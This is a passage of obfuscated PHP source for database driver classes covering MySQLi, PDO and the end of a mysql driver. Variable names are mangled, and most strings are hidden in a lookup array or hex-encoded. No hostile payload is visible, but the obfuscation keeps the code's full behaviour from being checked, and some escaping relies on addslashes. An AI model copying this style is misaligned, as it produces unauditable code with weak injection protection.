$Ôº•‘; } mysql_data_seek($this->queryID, 0); } return $’½½ú›; } public function getFields($È€á£Û) { $º÷µğà =& $_SERVER[¹Éµ„ºå]; $ˆÄáÈ¶ª = $this->query($º÷µğà[1051] . $this->parseKey($È€á£Û)); $ÃÚ·À Ã = array(); if ($ˆÄáÈ¶ª) { foreach ($ˆÄáÈ¶ª as $¤ê‘ı¹¦ => $¡ïÏ”ï´) { $ÃÚ·À Ã[$¡ïÏ”ï´[$º÷µğà[31]]] = array($º÷µğà[32] => $¡ïÏ”ï´[$º÷µğà[31]], $º÷µğà[33] => $¡ïÏ”ï´[$º÷µğà[34]], $º÷µğà[35] => (bool) (strtoupper($¡ïÏ”ï´[$º÷µğà[36]]) === $º÷µğà[1052]), $º÷µğà[37] => $¡ïÏ”ï´[$º÷µğà[38]], $º÷µğà[39] => strtolower($¡ïÏ”ï´[$º÷µğà[40]]) == $º÷µğà[41], $º÷µğà[42] => strtolower($¡ïÏ”ï´[$º÷µğà[43]]) == $º÷µğà[44]); } } return $ÃÚ·À Ã; } public function getTables($¹†ÅÄõ¾ = '') { $©Ì–†¢É =& $_SERVER[¹Éµ„ºå]; if (!empty($¹†ÅÄõ¾)) { $†ıàÈ¼ = $©Ì–†¢É[1053] . $¹†ÅÄõ¾ . $©Ì–†¢É[1054]; } else { $†ıàÈ¼ = $©Ì–†¢É[1055]; } $Çõ…ï»™ = $this->query($†ıàÈ¼); $±²»½Ÿ = array(); foreach ($Çõ…ï»™ as $ÖÄ¬ÅˆË => $§¼ºî‡ğ) { $±²»½Ÿ[$ÖÄ¬ÅˆË] = current($§¼ºî‡ğ); } return $±²»½Ÿ; } public function replace($óÑ¹É¦‘, $ç±²™Ô = array()) { $¿ß…óóÔ =& $_SERVER[¹Éµ„ºå]; foreach ($óÑ¹É¦‘ as $ Ï‚ãúò => $ß€Ú£­) { $¦Ş×˜È™ = $this->parseValue($ß€Ú£­); if (is_scalar($¦Ş×˜È™)) { $Ø¶Ñƒ‹³[] = $¦Ş×˜È™; $øâ©å›Ó[] = $this->parseKey($ Ï‚ãúò); } } $¯Ÿ¶Îëª = $¿ß…óóÔ[1056] . $this->parseTable($ç±²™Ô[$¿ß…óóÔ[357]]) . $¿ß…óóÔ[1057] . implode($¿ß…óóÔ[50], $øâ©å›Ó) . $¿ß…óóÔ[1058] . implode($¿ß…óóÔ[50], $Ø¶Ñƒ‹³) . $¿ß…óóÔ[1059]; return $this->execute($¯Ÿ¶Îëª); } public function insertAll($ªÍ“üÁ€, $ı…›óİô = array(), $ÓÌìØìş = false) { $›±´àÕ =& $_SERVER[¹Éµ„ºå]; if (!is_array($ªÍ“üÁ€[0])) { return !1; } $”›¼™Ó = array_keys($ªÍ“üÁ€[0]); $¯™éæ’¸ = array(); foreach ($ªÍ“üÁ€ as $ë£èùŒ°) { $öÂÎëÇ = array(); foreach ($ë£èùŒ° as $Ş‘Øƒ¹¯ => $ÖĞƒÔ—) { $ÖĞƒÔ— = $this->parseValue($ÖĞƒÔ—); if (is_scalar($ÖĞƒÔ—)) { $öÂÎëÇ[] = $ÖĞƒÔ—; } } $¯™éæ’¸[] = $›±´àÕ[337] . implode($›±´àÕ[50], $öÂÎëÇ) . $›±´àÕ[1059]; } array_walk($”›¼™Ó, array($this, $›±´àÕ[1060])); $ôÊÀÉÕ = $ÓÌìØìş ? $›±´àÕ[1061] : $›±´àÕ[1062]; $ôÊÀÉÕ = $›±´àÕ[1062]; $Ï©Ø‡ÔŸ = $ôÊÀÉÕ . $›±´àÕ[1063] . $this->parseTable($ı…›óİô[$›±´àÕ[357]]) . $›±´àÕ[1057] . implode($›±´àÕ[50], $”›¼™Ó) . $›±´àÕ[1064] . implode($›±´àÕ[50], $¯™éæ’¸); if ($ÓÌìØìş) { $ÃÖ¸°®í = array(); foreach ($”›¼™Ó as $Ş‘Øƒ¹¯) { if ($Ş‘Øƒ¹¯ == $›±´àÕ[231] || $Ş‘Øƒ¹¯ == $›±´àÕ[1065]) { continue; } $ÃÖ¸°®í[] = $Ş‘Øƒ¹¯ . $›±´àÕ[1066] . $Ş‘Øƒ¹¯ . $›±´àÕ[1059]; } $Ï©Ø‡ÔŸ .= $›±´àÕ[1067] . implode($›±´àÕ[50], $ÃÖ¸°®í); } return $this->execute($Ï©Ø‡ÔŸ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $œÎ¾õûÏ =& $_SERVER[¹Éµ„ºå]; $this->error = mysql_errno() . $œÎ¾õûÏ[4] . mysql_error($this->_linkID); if ($œÎ¾õûÏ[12] != $this->queryStr) { $this->error .= LNG($œÎ¾õûÏ[48]) . $this->queryStr; } think_trace($this->error, $œÎ¾õûÏ[12], $œÎ¾õûÏ[49]); return $this->error; } public function escapeString($©è›¥äó) { if ($this->_linkID) { return mysql_real_escape_string($©è›¥äó, $this->_linkID); } else { return mysql_escape_string($©è›¥äó); } } public function parseKey(&$ÙŠ´ÄÀ”, $‘ÚûÄ”Ğ = true) { $àêß£† =& $_SERVER[¹Éµ„ºå]; if ($‘ÚûÄ”Ğ) { $ÙŠ´ÄÀ” = $this->parseKeyCheck($ÙŠ´ÄÀ”); } if ($ÙŠ´ÄÀ” != $àêß£†[220] && !preg_match($àêß£†[1068], $ÙŠ´ÄÀ”)) { $ÙŠ´ÄÀ” = $àêß£†[475] . trim($ÙŠ´ÄÀ”, $àêß£†[475]) . $àêß£†[475]; } return $ÙŠ´ÄÀ”; } } class DbMysqli extends Db { public function __construct($¿ÕÒ“©ì = '') { $²ŞœÊŞ‡ =& $_SERVER[¹Éµ„ºå]; if (!extension_loaded($²ŞœÊŞ‡[1069])) { think_exception(think_lang($²ŞœÊŞ‡[14]) . $²ŞœÊŞ‡[1070]); } if (!empty($¿ÕÒ“©ì)) { $this->config = $¿ÕÒ“©ì; if (empty($this->config[$²ŞœÊŞ‡[17]])) { $this->config[$²ŞœÊŞ‡[17]] = $²ŞœÊŞ‡[12]; } } } public function connect($¹¨ÔÅ—ä = '', $ºÔ©¼Ó¾ = 0) { $¤½É¡ºû =& $_SERVER[¹Éµ„ºå]; if (!isset($this->linkID[$ºÔ©¼Ó¾])) { if (empty($¹¨ÔÅ—ä)) { $¹¨ÔÅ—ä = $this->config; } $this->linkID[$ºÔ©¼Ó¾] = new mysqli($¹¨ÔÅ—ä[$¤½É¡ºû[1040]], $¹¨ÔÅ—ä[$¤½É¡ºû[1042]], $¹¨ÔÅ—ä[$¤½É¡ºû[1043]], $¹¨ÔÅ—ä[$¤½É¡ºû[21]], $¹¨ÔÅ—ä[$¤½É¡ºû[1041]] ? intval($¹¨ÔÅ—ä[$¤½É¡ºû[1041]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $§ùÜ¬ù³ = $this->linkID[$ºÔ©¼Ó¾]->server_version; $this->linkID[$ºÔ©¼Ó¾]->query($¤½É¡ºû[1044] . think_config($¤½É¡ºû[1045]) . $¤½É¡ºû[58]); if ($§ùÜ¬ù³ > $¤½É¡ºû[1046]) { $this->linkID[$ºÔ©¼Ó¾]->query($¤½É¡ºû[1047]); } $this->connected = !0; if (1 != think_config($¤½É¡ºû[22])) { unset($this->config); } } return $this->linkID[$ºÔ©¼Ó¾]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($éêáœ‹¨) { $ÆİÒı½ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $éêáœ‹¨; if ($this->queryID) { $this->free(); } think_action_status($ÆİÒı½[23], 1); think_status($ÆİÒı½[24]); $this->queryID = $this->_linkID->query($éêáœ‹¨); if ($this->_linkID->more_results()) { while (($¹“Ü¨‡Ì = $this->_linkID->next_result()) != NULL) { $¹“Ü¨‡Ì->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‹ÊçÛË) { $§ÈİíĞ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹ÊçÛË; if ($this->queryID) { $this->free(); } think_action_status($§ÈİíĞ[25], 1); think_status($§ÈİíĞ[24]); $‹¡òİ† = $this->_linkID->query($‹ÊçÛË); $this->debug(); if (!1 === $‹¡òİ†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„Òâ£î = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$„Òâ£î) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»€’«ùÅ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»€’«ùÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $‰‹Äì’Å = array(); if ($this->numRows > 0) { for ($¨ÎãÇ”Ğ = 0; $¨ÎãÇ”Ğ < $this->numRows; $¨ÎãÇ”Ğ++) { $‰‹Äì’Å[$¨ÎãÇ”Ğ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‰‹Äì’Å; } public function getFields($Àôƒ¸«Ô) { $›âÕŒà÷ =& $_SERVER[¹Éµ„ºå]; $©Íì–¸µ = $this->query($›âÕŒà÷[1051] . $this->parseKey($Àôƒ¸«Ô)); $§´çµÍ¥ = array(); if ($©Íì–¸µ) { foreach ($©Íì–¸µ as $®×ç†„± => $ •°ÍÌî) { $§´çµÍ¥[$ •°ÍÌî[$›âÕŒà÷[31]]] = array($›âÕŒà÷[32] => $ •°ÍÌî[$›âÕŒà÷[31]], $›âÕŒà÷[33] => $ •°ÍÌî[$›âÕŒà÷[34]], $›âÕŒà÷[35] => (bool) ($ •°ÍÌî[$›âÕŒà÷[36]] === $›âÕŒà÷[12]), $›âÕŒà÷[37] => $ •°ÍÌî[$›âÕŒà÷[38]], $›âÕŒà÷[39] => strtolower($ •°ÍÌî[$›âÕŒà÷[40]]) == $›âÕŒà÷[41], $›âÕŒà÷[42] => strtolower($ •°ÍÌî[$›âÕŒà÷[43]]) == $›âÕŒà÷[44]); } } return $§´çµÍ¥; } public function getTables($Ñµåˆöë = '') { $ƒÏÓ–°² =& $_SERVER[¹Éµ„ºå]; $Ïğ®× Ÿ = !empty($Ñµåˆöë) ? $ƒÏÓ–°²[1053] . $Ñµåˆöë . $ƒÏÓ–°²[1054] : $ƒÏÓ–°²[1055]; $å §©‡ = $this->query($Ïğ®× Ÿ); $ª„­Ğªø = array(); if ($å §©‡) { foreach ($å §©‡ as $•¨–•ƒê => $Ö¯¤ù¼™) { $ª„­Ğªø[$•¨–•ƒê] = current($Ö¯¤ù¼™); } } return $ª„­Ğªø; } public function replace($Ì½ù®Ä©, $ƒëÏå™ = array()) { $„À²ˆĞ‚ =& $_SERVER[¹Éµ„ºå]; foreach ($Ì½ù®Ä© as $©¶¾«ÂÇ => $‡­‘ûÓ–) { $¶†Çº¿© = $this->parseValue($‡­‘ûÓ–); if (is_scalar($¶†Çº¿©)) { $¤ß§è—[] = $¶†Çº¿©; $ı¶Ş„Ÿï[] = $this->parseKey($©¶¾«ÂÇ); } } $°¢ê€›ò = $„À²ˆĞ‚[1056] . $this->parseTable($ƒëÏå™[$„À²ˆĞ‚[357]]) . $„À²ˆĞ‚[1057] . implode($„À²ˆĞ‚[50], $ı¶Ş„Ÿï) . $„À²ˆĞ‚[1058] . implode($„À²ˆĞ‚[50], $¤ß§è—) . $„À²ˆĞ‚[1059]; return $this->execute($°¢ê€›ò); } public function insertAll($—ã§µÒÎ, $Û³¤›Åé = array(), $Ç£çğÊ = false) { $ˆŞĞ„ã” =& $_SERVER[¹Éµ„ºå]; if (!is_array($—ã§µÒÎ[0])) { return !1; } $­–¸¼å÷ = array_keys($—ã§µÒÎ[0]); $şèŒÆÊİ = array(); foreach ($—ã§µÒÎ as $ÄùÜß‰Œ) { $ç¯´êÊÚ = array(); foreach ($ÄùÜß‰Œ as $½Ñ–‚ü˜ => $¼¦µ«¡Î) { $¼¦µ«¡Î = $this->parseValue($¼¦µ«¡Î); if (is_scalar($¼¦µ«¡Î)) { $ç¯´êÊÚ[] = $¼¦µ«¡Î; } } $şèŒÆÊİ[] = $ˆŞĞ„ã”[337] . implode($ˆŞĞ„ã”[50], $ç¯´êÊÚ) . $ˆŞĞ„ã”[1059]; } array_walk($­–¸¼å÷, array($this, $ˆŞĞ„ã”[1060])); $ƒ¨ı¢ = $Ç£çğÊ ? $ˆŞĞ„ã”[1061] : $ˆŞĞ„ã”[1062]; $ƒ¨ı¢ = $ˆŞĞ„ã”[1062]; $ô®˜¬ÕÑ = $ƒ¨ı¢ . $ˆŞĞ„ã”[1063] . $this->parseTable($Û³¤›Åé[$ˆŞĞ„ã”[357]]) . $ˆŞĞ„ã”[1057] . implode($ˆŞĞ„ã”[50], $­–¸¼å÷) . $ˆŞĞ„ã”[1064] . implode($ˆŞĞ„ã”[50], $şèŒÆÊİ); if ($Ç£çğÊ) { $ø•ø¿¦ù = array(); foreach ($­–¸¼å÷ as $½Ñ–‚ü˜) { if ($½Ñ–‚ü˜ == $ˆŞĞ„ã”[231] || $½Ñ–‚ü˜ == $ˆŞĞ„ã”[1065]) { continue; } $ø•ø¿¦ù[] = $½Ñ–‚ü˜ . $ˆŞĞ„ã”[1066] . $½Ñ–‚ü˜ . $ˆŞĞ„ã”[1059]; } $ô®˜¬ÕÑ .= $ˆŞĞ„ã”[1067] . implode($ˆŞĞ„ã”[50], $ø•ø¿¦ù); } return $this->execute($ô®˜¬ÕÑ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¸²æİüå =& $_SERVER[¹Éµ„ºå]; $this->error = $this->_linkID->errno . $¸²æİüå[4] . $this->_linkID->error; if ($¸²æİüå[12] != $this->queryStr) { $this->error .= LNG($¸²æİüå[48]) . $this->queryStr; } think_trace($this->error, $¸²æİüå[12], $¸²æİüå[49]); return $this->error; } public function escapeString($Ûˆ¸Âöß) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ûˆ¸Âöß); } else { return addslashes($Ûˆ¸Âöß); } } public function parseKey(&$›¯Ìş•×, $ÎØ¸¿ğ‹ = true) { $€¿ùòåó =& $_SERVER[¹Éµ„ºå]; if ($ÎØ¸¿ğ‹) { $›¯Ìş•× = $this->parseKeyCheck($›¯Ìş•×); } if ($›¯Ìş•× != $€¿ùòåó[220] && !preg_match($€¿ùòåó[1068], $›¯Ìş•×)) { $›¯Ìş•× = $€¿ùòåó[475] . trim($›¯Ìş•×, $€¿ùòåó[475]) . $€¿ùòåó[475]; } return $›¯Ìş•×; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($”ÁÃ® = '') { $‹Íö¤à™ =& $_SERVER[¹Éµ„ºå]; if (!class_exists($‹Íö¤à™[1071])) { think_exception(think_lang($‹Íö¤à™[14]) . $‹Íö¤à™[1072]); } if (!empty($”ÁÃ®)) { $this->config = $”ÁÃ®; if (empty($this->config[$‹Íö¤à™[17]])) { $this->config[$‹Íö¤à™[17]] = array(); } } } public function connect($ŠæšÇØÉ = '', $ëË÷ùğÑ = 0) { $òşà“úü =& $_SERVER[¹Éµ„ºå]; if (!isset($this->linkID[$ëË÷ùğÑ])) { if (empty($ŠæšÇØÉ)) { $ŠæšÇØÉ = $this->config; } $ˆ×ß¢ = !empty($ŠæšÇØÉ[$òşà“úü[17]][$òşà“úü[18]]) ? $ŠæšÇØÉ[$òşà“úü[17]][$òşà“úü[18]] : $this->pconnect; if ($ˆ×ß¢) { $ŠæšÇØÉ[$òşà“úü[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ëË÷ùğÑ] = new PDO($ŠæšÇØÉ[$òşà“úü[1073]], $ŠæšÇØÉ[$òşà“úü[1042]], $ŠæšÇØÉ[$òşà“úü[1043]], $ŠæšÇØÉ[$òşà“úü[17]]); } catch (PDOException $ÔÀ¨‰ÙÑ) { think_exception($ÔÀ¨‰ÙÑ->getMessage()); } $this->dbType = $this->_getDsnType($ŠæšÇØÉ[$òşà“úü[1073]]); if (in_array($this->dbType, array($òşà“úü[1074], $òşà“úü[1075], $òşà“úü[1076], $òşà“úü[1077]))) { think_exception($òşà“úü[1078] . $this->dbType . $òşà“úü[1079] . $this->dbType . $òşà“úü[1080]); } if (!$this->linkID[$ëË÷ùğÑ]) { think_exception($òşà“úü[1081]); } try { $this->linkID[$ëË÷ùğÑ]->exec($òşà“úü[1082] . think_config($òşà“úü[1045])); } catch (Exception $ÔÀ¨‰ÙÑ) { } $this->connected = !0; if (1 != think_config($òşà“úü[22])) { unset($this->config); } } return $this->linkID[$ëË÷ùğÑ]; } public function free() { $this->PDOStatement = null; } public function query($ñî¼‰¾, $½É¢ş = array()) { $ˆéí»Ş÷ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñî¼‰¾; if (!empty($½É¢ş)) { $this->queryStr .= $ˆéí»Ş÷[1083] . print_r($½É¢ş, !0) . $ˆéí»Ş÷[1084]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ˆéí»Ş÷[23], 1); think_status($ˆéí»Ş÷[24]); $this->PDOStatement = $this->_linkID->prepare($ñî¼‰¾); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ƒÁˆ’¦£ = $this->PDOStatement->execute($½É¢ş); $this->debug(); if (!1 === $ƒÁˆ’¦£) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($§Ù—»¿, $øúÙñÊÃ = array()) { $Š›ĞÍÄÄ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§Ù—»¿; if (!empty($øúÙñÊÃ)) { $this->queryStr .= $Š›ĞÍÄÄ[1083] . print_r($øúÙñÊÃ, !0) . $Š›ĞÍÄÄ[1084]; } $½Îèíì° = !1; if ($this->dbType == $Š›ĞÍÄÄ[1077]) { if (preg_match($Š›ĞÍÄÄ[1085], $this->queryStr, $Ğ™Ôç–´)) { $this->table = think_config($Š›ĞÍÄÄ[1086]) . str_ireplace(think_config($Š›ĞÍÄÄ[1087]), $Š›ĞÍÄÄ[463], $Ğ™Ôç–´[2]); $½Îèíì° = (bool) $this->query($Š›ĞÍÄÄ[1088] . strtoupper($this->table) . $Š›ĞÍÄÄ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Š›ĞÍÄÄ[25], 1); think_status($Š›ĞÍÄÄ[24]); $this->PDOStatement = $this->_linkID->prepare($§Ù—»¿); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¯Å¥…Ç = $this->PDOStatement->execute($øúÙñÊÃ); $this->debug(); if (!1 === $¯Å¥…Ç) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($½Îèíì° || preg_match($Š›ĞÍÄÄ[1089], $§Ù—»¿)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Å¬í•å = $this->_linkID->commit(); $this->transTimes = 0; if (!$Å¬í•å) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µãÛš¨Ä = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µãÛš¨Ä) { $this->error(); return !1; } } return !0; } private function getAll() { $íËŒ‚×ü = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($íËŒ‚×ü); return $íËŒ‚×ü; } public function getFields($¥ò¬ÌÅ) { $Â—ƒà’ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (think_config($Â—ƒà’[1090])) { $±±ºó ‘ = str_replace($Â—ƒà’[1091], $¥ò¬ÌÅ, think_config($Â—ƒà’[1090])); } else { switch ($this->dbType) { case $Â—ƒà’[1074]: case $Â—ƒà’[1092]: $±±ºó ‘ = "\123\x45\x4c\105\103\x54\40\x20\x20\143\x6f\x6c\165\155\156\x5f\156\141\155\145\x20\x61\x73\40\x27\x4e\x61\x6d\145\x27\54\x20\40\40\144\x61\164\141\x5f\164\171\x70\x65\40\x61\163\40\x27\x54\x79\x70\x65\47\54\x20\40\x20\x63\x6f\154\x75\x6d\x6e\x5f\144\x65\146\x61\165\154\164\x20\141\x73\40\47\104\x65\x66\141\x75\154\x74\x27\54\x20\x20\40\x69\163\137\x6e\165\x6c\154\x61\142\x6c\x65\x20\x61\163\x20\47\116\x75\154\154\47\xa\11\x9\106\122\x4f\x4d\x9\151\x6e\146\x6f\x72\x6d\141\x74\151\x6f\156\x5f\x73\143\x68\x65\x6d\141\56\x74\x61\x62\154\x65\x73\x20\101\x53\x20\164\xa\x9\x9\x4a\x4f\111\116\11\x69\x6e\x66\x6f\162\x6d\x61\x74\x69\x6f\x6e\x5f\x73\143\x68\x65\155\x61\56\143\x6f\154\165\155\156\163\x20\101\x53\40\143\12\11\x9\x4f\116\x20\x20\164\x2e\x74\x61\142\x6c\x65\x5f\x63\141\164\x61\154\157\147\x20\75\40\x63\x2e\x74\x61\142\154\145\x5f\143\141\x74\141\x6c\x6f\x67\12\11\11\x41\116\x44\40\x74\x2e\164\x61\x62\154\x65\x5f\x73\143\x68\x65\155\x61\x20\75\40\143\x2e\164\141\x62\154\145\x5f\163\143\x68\145\155\x61\12\x9\11\101\x4e\x44\x20\164\x2e\164\141\x62\154\x65\x5f\156\141\155\145\x20\75\40\x63\x2e\164\x61\x62\x6c\145\137\x6e\141\x6d\145\xa\11\x9\127\110\x45\122\x45\x20\x20\40\x74\56\x74\x61\142\x6c\145\137\156\x61\155\145\x20\75\x20\x27{$¥ò¬ÌÅ}\x27"; break; case $Â—ƒà’[1093]: $±±ºó ‘ = $Â—ƒà’[1094] . $¥ò¬ÌÅ . $Â—ƒà’[1095]; break; case $Â—ƒà’[1075]: case $Â—ƒà’[1077]: $±±ºó ‘ = $Â—ƒà’[1096] . $Â—ƒà’[1097] . $Â—ƒà’[1098] . strtoupper($¥ò¬ÌÅ) . $Â—ƒà’[1099] . strtoupper($¥ò¬ÌÅ) . $Â—ƒà’[1100]; break; case $Â—ƒà’[1101]: $±±ºó ‘ = $Â—ƒà’[1102] . $¥ò¬ÌÅ . $Â—ƒà’[1103]; break; case $Â—ƒà’[1076]: break; case $Â—ƒà’[1104]: default: $±±ºó ‘ = $Â—ƒà’[1105] . ($this->dbType == $Â—ƒà’[1104] ? "\140{$¥ò¬ÌÅ}\140" : $¥ò¬ÌÅ); } } $ãü²äó… = $this->query($±±ºó ‘); $„§¬ÄÃ = array(); if ($ãü²äó…) { foreach ($ãü²äó… as $ÜŸ¾ï—Ó => $¨ú‘“™) { $¨ú‘“™ = array_change_key_case($¨ú‘“™); $¨ú‘“™[$Â—ƒà’[32]] = isset($¨ú‘“™[$Â—ƒà’[32]]) ? $¨ú‘“™[$Â—ƒà’[32]] : $Â—ƒà’[463]; $¨ú‘“™[$Â—ƒà’[33]] = isset($¨ú‘“™[$Â—ƒà’[33]]) ? $¨ú‘“™[$Â—ƒà’[33]] : $Â—ƒà’[463]; $¿®Ç½ã  = isset($¨ú‘“™[$Â—ƒà’[351]]) ? $¨ú‘“™[$Â—ƒà’[351]] : $¨ú‘“™[$Â—ƒà’[32]]; $„§¬ÄÃ[$¿®Ç½ã ] = array($Â—ƒà’[32] => $¿®Ç½ã , $Â—ƒà’[33] => $¨ú‘“™[$Â—ƒà’[33]], $Â—ƒà’[35] => (bool) (isset($¨ú‘“™[$Â—ƒà’[103]]) && $¨ú‘“™[$Â—ƒà’[103]] === $Â—ƒà’[12] || isset($¨ú‘“™[$Â—ƒà’[35]]) && $¨ú‘“™[$Â—ƒà’[35]] === $Â—ƒà’[12]), $Â—ƒà’[37] => isset($¨ú‘“™[$Â—ƒà’[37]]) ? $¨ú‘“™[$Â—ƒà’[37]] : (isset($¨ú‘“™[$Â—ƒà’[56]]) ? $¨ú‘“™[$Â—ƒà’[56]] : $Â—ƒà’[463]), $Â—ƒà’[39] => isset($¨ú‘“™[$Â—ƒà’[95]]) ? strtolower($¨ú‘“™[$Â—ƒà’[95]]) == $Â—ƒà’[41] : (isset($¨ú‘“™[$Â—ƒà’[57]]) ? $¨ú‘“™[$Â—ƒà’[57]] : !1), $Â—ƒà’[42] => isset($¨ú‘“™[$Â—ƒà’[1106]]) ? strtolower($¨ú‘“™[$Â—ƒà’[1106]]) == $Â—ƒà’[44] : (isset($¨ú‘“™[$Â—ƒà’[95]]) ? $¨ú‘“™[$Â—ƒà’[95]] : !1)); } } return $„§¬ÄÃ; } public function getTables($Ôé½¹Ë = '') { $··¬«è =& $_SERVER[¹Éµ„ºå]; if (think_config($··¬«è[1107])) { $ŠîÁ•“ = str_replace($··¬«è[1108], $Ôé½¹Ë, think_config($··¬«è[1107])); } else { switch ($this->dbType) { case $··¬«è[1075]: case $··¬«è[1077]: $ŠîÁ•“ = $··¬«è[1109]; break; case $··¬«è[1074]: case $··¬«è[1092]: $ŠîÁ•“ = $··¬«è[1110]; break; case $··¬«è[1101]: $ŠîÁ•“ = $··¬«è[1111]; break; case $··¬«è[1076]: think_exception(think_lang($··¬«è[1112]) . $··¬«è[1113]); break; case $··¬«è[1093]: $ŠîÁ•“ = $··¬«è[45] . $··¬«è[46] . $··¬«è[47]; break; case $··¬«è[1104]: default: if (!empty($Ôé½¹Ë)) { $ŠîÁ•“ = $··¬«è[1053] . $Ôé½¹Ë . $··¬«è[1054]; } else { $ŠîÁ•“ = $··¬«è[1055]; } } } $‘ …Šİ‰ = $this->query($ŠîÁ•“); $Ó´ÔœÜ„ = array(); foreach ($‘ …Šİ‰ as $Õ½¨™ => $Öæ¯„–õ) { $Ó´ÔœÜ„[$Õ½¨™] = current($Öæ¯„–õ); } return $Ó´ÔœÜ„; } protected function parseLimit($İÎÏÈğ) { $ğöøÔİ³ =& $_SERVER[¹Éµ„ºå]; $¢ëØÆª° = $ğöøÔİ³[12]; if (!empty($İÎÏÈğ)) { switch ($this->dbType) { case $ğöøÔİ³[1101]: case $ğöøÔİ³[1093]: $İÎÏÈğ = explode($ğöøÔİ³[50], $İÎÏÈğ); if (count($İÎÏÈğ) > 1) { $¢ëØÆª° .= $ğöøÔİ³[51] . $İÎÏÈğ[1] . $ğöøÔİ³[52] . $İÎÏÈğ[0] . $ğöøÔİ³[53]; } else { $¢ëØÆª° .= $ğöøÔİ³[51] . $İÎÏÈğ[0] . $ğöøÔİ³[53]; } break; case $ğöøÔİ³[1074]: case $ğöøÔİ³[1092]: break; case $ğöøÔİ³[1076]: break; case $ğöøÔİ³[1075]: case $ğöøÔİ³[1077]: break; case $ğöøÔİ³[1104]: default: $¢ëØÆª° .= $ğöøÔİ³[51] . $İÎÏÈğ . $ğöøÔİ³[53]; } } return $¢ëØÆª°; } public function parseKey(&$ÙÛº›Ø¿, $¿ï‘Âõ = true) { $Ü¤†»Ó¸ =& $_SERVER[¹Éµ„ºå]; if ($¿ï‘Âõ) { $ÙÛº›Ø¿ = $this->parseKeyCheck($ÙÛº›Ø¿); } if ($this->dbType == $Ü¤†»Ó¸[1104]) { if ($ÙÛº›Ø¿ != $Ü¤†»Ó¸[220] && !preg_match($Ü¤†»Ó¸[1068], $ÙÛº›Ø¿)) { $ÙÛº›Ø¿ = $Ü¤†»Ó¸[475] . trim($ÙÛº›Ø¿, $Ü¤†»Ó¸[475]) . $Ü¤†»Ó¸[475]; } return $ÙÛº›Ø¿; } else { return parent::parseKey($ÙÛº›Ø¿, $¿ï‘Âõ); } } public function close() { $this->_linkID = null; } public function error() { $¼Æ¬¥Šó =& $_SERVER[¹Éµ„ºå]; if ($this->PDOStatement) { $¯ùÂİøí = $this->PDOStatement->errorInfo(); $this->error = $¯ùÂİøí[1] . $¼Æ¬¥Šó[4] . $¯ùÂİøí[2]; } else { $this->error = $¼Æ¬¥Šó[12]; } if ($¼Æ¬¥Šó[12] != $this->queryStr) { $this->error .= LNG($¼Æ¬¥Šó[48]) . $this->queryStr; } think_trace($this->error, $¼Æ¬¥Šó[12], $¼Æ¬¥Šó[49]); return $this->error; } public function escapeString($òÛñ÷×ã) { $‡Ù¢ÚÈÖ =& $_SERVER[¹Éµ„ºå]; switch ($this->dbType) { case $‡Ù¢ÚÈÖ[1101]: case $‡Ù¢ÚÈÖ[1074]: case $‡Ù¢ÚÈÖ[1092]: case $‡Ù¢ÚÈÖ[1104]: return addslashes($òÛñ÷×ã); case $‡Ù¢ÚÈÖ[1076]: case $‡Ù¢ÚÈÖ[1093]: case $‡Ù¢ÚÈÖ[1075]: case $‡Ù¢ÚÈÖ[1077]: return str_ireplace($‡Ù¢ÚÈÖ[58], $‡Ù¢ÚÈÖ[59], $òÛñ÷×ã); } } protected function parseValue($àäÈÆ) { $¿­İŞô™ =& $_SERVER[¹Éµ„ºå]; if (is_string($àäÈÆ)) { $Àâï©´ï = strpos($àäÈÆ, $¿­İŞô™[4]) === 0 && in_array($àäÈÆ, array_keys($this->bind)); $àäÈÆ = $Àâï©´ï ? $this->escapeString($àäÈÆ) : $¿­İŞô™[1114] . $this->escapeString($àäÈÆ) . $¿­İŞô™[1114]; } elseif (isset($àäÈÆ[0]) && is_string($àäÈÆ[0]) && strtolower($àäÈÆ[0]) == $¿­İŞô™[372]) { $àäÈÆ = $this->escapeString($àäÈÆ[1]); } elseif (is_array($àäÈÆ)) { $àäÈÆ = 